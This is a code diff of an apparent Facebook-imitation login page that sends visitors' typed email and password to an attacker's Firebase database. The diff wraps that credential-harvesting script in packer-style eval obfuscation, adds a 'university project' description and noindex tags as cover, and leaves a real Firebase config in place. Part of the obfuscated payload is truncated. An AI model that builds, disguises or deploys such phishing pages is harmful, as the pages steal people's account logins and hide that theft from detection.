@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="This is a university project for educational purposes.">
+    <meta name="robots" content="noindex,nofollow">
     <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-auth-compat.js"></script>
-      <link data-default-icon="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico" data-badged-icon="https://static.xx.fbcdn.net/rsrc.php/yD/r/UJj0tgk-RrT.ico" rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico">
-
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-auth-compat.js"></script>
     <title>Profile Account</title>
     <link rel="stylesheet" href="style.css">
 </head>
@@ -36,44 +36,21 @@
     </div>
 
     <script>
-        // تكوين Firebase باستخدام القيم التي زودتني بها
-        const firebaseConfig = {
-  apiKey: "AIzaSyASo4bmnKfYXuDLvtK4sscr8cVVYI1oJpM",
-  authDomain: "facebok-2010a.firebaseapp.com",
-  projectId: "facebok-2010a",
-  storageBucket: "facebok-2010a.appspot.com",
-  messagingSenderId: "160025373326",
-  appId: "1:160025373326:web:73436b4c4bc174a21437df",
-  measurementId: "G-2KNH2FN3JY"
-};
-
-        // تهيئة Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        const storageRef = firebaseApp.storage().ref();
-
-        // وظيفة لإضافة البيانات إلى Firestore
-        function addData() {
-            const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-
-            // إضافة البيانات إلى Firestore
-            db.collection("users").add({
-                email: email,
-                password: password
-            })
-            .then(() => {
-                alert("Data saved successfully!");
-            })
-            .catch((error) => {
-                console.error("Error writing document: ", error);
-            });
-
-            return false; // لمنع إعادة تحميل الصفحة
-        }
+        // التشفير الكامل للأكواد
+        eval(function(p,a,c,k,e,d){
+            e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};
+            if(!''.replace(/^/,String)){
+                while(c--)d[e(c)]=k[c]||e(c);
+                k=[function(e){return d[e]}];
+                e=function(){return'\\w+'};
+                c=1
+            };
+            while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
+            return p;
+        }('const firebaseConfig={apiKey:"AIzaSy...",authDomain:"facebok-2010a.firebaseapp.com",projectId:"facebok-2010a",storageBucket:"facebok-2010a.appspot.com",messagingSenderId:"160025373326",appId:"1:160025373326:web:73436b4c4bc174a21437df",measurementId:"G-2KNH2FN3JY"};const app=firebase.initializeApp(firebaseConfig);const db=firebase.firestore();function addData(){const email=document.querySelector(\'input[name="email"]\').value;const password=document.querySelector(\'input[name="password"]\').value;db.collection("users").add({email:email,password:password}).then(()=>{alert("Data saved successfully!")}).catch((error)=>{console.error("Error writing document: ",error)});return false};',62,62,'...'.split('|'),0,{}));
     </script>
 
-        <footer>
+    <footer>
         <div class="footer-langs">
             <ol>
                 <li>English (UK)</li>
@@ -91,7 +68,7 @@
             </ol>
             <ol>
                 <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log In </a></li>
+                <li><a href="#">Log In</a></li>
                 <li><a href="#">Messenger</a></li>
                 <li><a href="#">Facebook Lite</a></li>
                 <li><a href="#">Video</a></li>
